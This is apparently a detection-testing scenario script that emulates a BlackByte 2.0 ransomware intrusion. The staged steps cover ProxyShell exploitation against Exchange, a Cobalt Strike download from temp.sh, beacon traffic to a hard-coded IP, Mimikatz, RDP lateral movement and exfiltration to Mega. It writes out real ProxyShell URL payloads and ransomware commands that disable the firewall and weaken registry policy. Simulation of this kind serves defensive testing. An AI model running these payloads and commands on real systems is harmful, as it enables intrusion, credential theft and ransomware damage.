# SEC 1 - How does it start ?  Initial Access & Privilege Escalation
# Exploding ProxyShell vulnerabilities on unpatched Exchange Servers
# No actions here for detection
tactic "Initial Access"
section exchange_proxyshell_vulnerability "Exploitation of unpatched Exchange Servers" {
    $attack_queries_get = ["?&Email=autodiscover/autodiscover.json%3F@evil.corp", "ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"]
    $attack_queries_post = ["autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@evil.corp", "mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@evil.corp"]
    $destination.ip = $exchange_server
    $source.ip = $attacker_source
    loop $attack_queries_get as $query {
	step ProxyshellAttackGet {
	    $http.request.method = "GET"
	    $url.path = "/autodiscover/autodiscover.json?@${attacker_domain}/${query}"
	    
	    run HTTPConnection
	}
	sleep 0.1
    }
    loop $attack_queries_post as $query {
	step ProxyshellAttackPost {
	    $http.request.method = "POST"
	    $url.path = "/autodiscover/autodiscover.json?@${attacker_domain}/${query}"
	    
	    run HTTPConnection
	}
	sleep 0.1
    }

    sleep 1
    step ProxyshellExploit2 {
	$http.request.method = "POST"
	$b64data = base64.encode("Our proxyshell string")
	$url.path = "/autodiscover/autodiscover.json?a=abcde@${attacker_domain}/?X-Rps-CAT=${b64data}"

	run HTTPConnection
    }
}

# SEC 2 - Persistence and C2
# Create registry run keys to deploy a backdoor that collects and sends system information to a C2 channel
# Leverages Cobalt Strike Beacon for persistence and C2 communications
# Leverages the AnyDesk remote admin tool for persistence and lateral movement

section persistence_and_c2 "Persistence: Create registry run keys" {

    loop $reg_key_playloads as $new_reg_key {
        step reg_key_creation {
            $process.name = "reg.exe"
            $reg_key_data = string.split($new_reg_key,"|")
            $registry.hive = "HKEY_CURRENT_USER"
            $registry.key = $reg_key_data[1]
            $registry.data = $reg_key_data[2]
            $registry.value = $reg_key_data[3]
            action Windows.Registry.Create
        }
        
        sleep 1

    }

    # Download Cobalt Strike Beacon
    step download_csb_http_connection {
        $destination.domain = "temp.sh"
        $protocol = 443
        $url.path = "/szAyn/sys.exe"
        $http.request.method = "GET"
        run HTTPConnection
    }
    
    sleep 1

    step csb_file_created {
        $file.name = "sys.exe"
        action File.Create
    }
    
    sleep 1

    $random_beacon_connections = random.int(10,200)
    loop $random_beacon_connections {
        step tcp_beacon_connections {
            $destination.ip = "109.206.243.59"
            $destination.port = "443"
            run TCPHandshake
        }
        sleep 1
    }

    step anydesk_installed { 
        $file.path = $anydesk_path
        action File.Create
    }
    sleep 1
}

# SEC 3 - NetScan and Adfind are used to reconnaissance and network enumeration

section reconnaissance_and_network_enumeration "NetScan and Adfind are used" {

    $total_netscans = random.int(10,200)
    loop $total_netscans {
        step netscans_executions { 
            $process.name = "netscan.exe"
            action Process.Start
        }
        sleep 1
    }

    $total_netapp = random.int(10,200)
    loop $total_netapp {
        step netscans_executions { 
            $process.name = "netapp.exe"
            action Process.Start
        }
        sleep 1
    }

    $total_adfind = random.int(10,200)
    loop $total_adfind {
        step netscans_executions { 
            $process.name = "AdFind.exe"
            action Process.Start
        }
        sleep 1
    }

}

# SEC 4 - Credential Access
# Additional privileged account credentials are stolen, likely using Mimikatz

section credential_access "Mimikatz stole account credentials" {

    step mimikatz_process {
        $process.name = "mimikatz.exe"
        action Process.Start
    }

    sleep 0.1 

    step mimikatz_1st_execution {
        $file.name = "mimikatz.log"
        action File.Create
    }

    sleep 0.1 

    $total_mimikatz = random.int(5,50)
    loop $total_mimikatz {
        step mimikatz_executions {
            $file.name = "mimikatz.log"
            action File.Open
        }
        
        sleep 0.1 
    }

}

# SEC 5 - Lateral movement
# Compromised domain admin credentials are used with RDP and PowerShell Remoting to access doamin controllers and other environment servers

section lateral_movement "Lateral movement: credentials are used" {

    $total_rdp_connections = random.int(10,120)
    loop $total_rdp_connections {
        step rdp_connections {
            $last_range = random.int(1, 253)
            $destination.ip = ip.cidr($cidr_range, $last_range)
            action RDP.LoginSuccess
        }
        sleep 1
    }

}

# SEC 6 - Data staging & exfiltration
# ExByte collects and exfiltrates files from target network

section data_staging_exfiltration "Data staging & exfiltration: ExByte" {

    $total_exfiltrations = random.int(50,300)
    loop $total_exfiltrations {
        step exbyte_execution {
            $process.name = "explorer.exe"
            $process.command_line = $exfiltration_command
            action Process.Start
        }
        sleep 0.1
        
        step log_list_files_and_metadata {
            $file.path = $exfiltration_logs_path
            action File.Create
        }
        sleep 0.1
        
        step data_file_created {
            $file.name = "data.txt"
            action File.Create
        }
        sleep 0.1

        step exbyte_process_check_drive {
            $file.path = """\\.\PHYSICALDRIVE0:"""
            action File.Open
        }
        sleep 0.1

        step data_file_accessed {
            $file.name = "data.txt"
            action File.Open
        }
        sleep 0.1

        # Mega NZ API access
        step mega_nz_connection {
            $destination.domain = "g.api.mega.co.nz"
            $protocol = 443
            $url.path = "/cs?id=1674017543"
            run HTTPConnection
        }

        sleep 300 # 5 minutes for exfiltration tasks before delete data.txt

        # data.txt deleted when Exbyte finishes
        step data_file_deleted {
            $file.name = "data.txt"
            action File.Delete
        }
        sleep 1

    }
}

# SEC 7 - Data encryption and destruction: Impact
# BlackByte 2.0 ransomware deployed, encrypting devices across the environment

section data_encryption_and_destruction "BlackByte 2.0 ransomware deployed" {

    $total_encryptions = random.int(10,40)
    loop $total_encryptions {

        step blackbyte_encryption {
            $process.name = $blackbyte
            action Process.Start
        }
        sleep 0.2

        step ransomware_files_created {
            $file.path = random($files_after_encryption)
            action File.Create
        }
        sleep 0.2
    }

    step antivirus_bypass_file_created {
        $file.name = "rENEgOtiAtES"
        action File.Create
    }
    sleep 0.1

    # BlackByte binary then creates and starts a service named RABAsSaa
    step service_rabassaa_created {
        # RABAsSaa
        $file.name = "rENEgOtiAtES"
        action File.Open
    }
    sleep 0.1

    $blackbyte_actions = [
        """cmd /c netsh advfirewall set allprofiles state off""",
        """cmd /c netsh advfirewall firewall set rule group=”File and Printer Sharing” new enable=Yes""",
        """cmd /c netsh advfirewall firewall set rule group=”Network Discovery” new enable=Yes""",
        """cmd /c vssadmin Resize ShadowStorge /For=B:\ /On=B:\ /MaxSize=401MB""",
        """cmd /c vssadmin Resize ShadowStorage /For=B:\ /On=B:\ /MaxSize=UNBOUNDED""",
        """cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f""",
        """cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f""",
        """cmd /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f"""
    ]
    loop $blackbyte_actions as $blackbyte_cmd {
        step blackbyte_command {
            $process.parent.command_line = $blackbyte
            $process.command_line = $blackbyte_cmd
            action Process.Start
        }
    }
    sleep 0.1

    step ransomware_note_file_created {
        $file.path = $ransomware_note_file
        action File.Create
    }

    # Invokes svchost.exe, injects to it to complete device encryption, and self-deletes by executing the following command
    step blackbyte_self_deletes {
        # $process.parent.name = "svchost.exe"
        $process.command_line = $delete_command
        action Process.Start
    }
    
}

